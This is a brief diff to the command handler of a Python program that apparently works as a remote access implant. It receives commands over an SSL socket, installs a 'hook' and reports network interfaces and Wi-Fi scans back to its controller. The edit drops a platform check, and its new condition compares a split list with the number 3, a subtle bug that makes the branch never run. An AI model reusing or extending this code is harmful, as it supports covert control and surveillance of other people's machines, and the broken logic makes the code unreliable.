@@ -352,11 +352,12 @@ while 1:
         ssl_sock.close()
         sys.exit(0)
     elif inText.startswith("hook"):
-        if platform.system() == "Linux":
+        if inText.split(':') == 3:
             hookstat = LinuxHOOK(inText.split(':')[1],inText.split(":")[2])
             SendData(hookstat)
         else:
-            SendData("Error: platform not supported!")
+            hookstat = LinuxHOOK(inText.split(':')[1],"")
+            SendData(hookstat)
     elif inText == "get-inferfaces":
         SendData(str(netifaces.interfaces()))
     elif inText.startswith("ScanWIFI"):
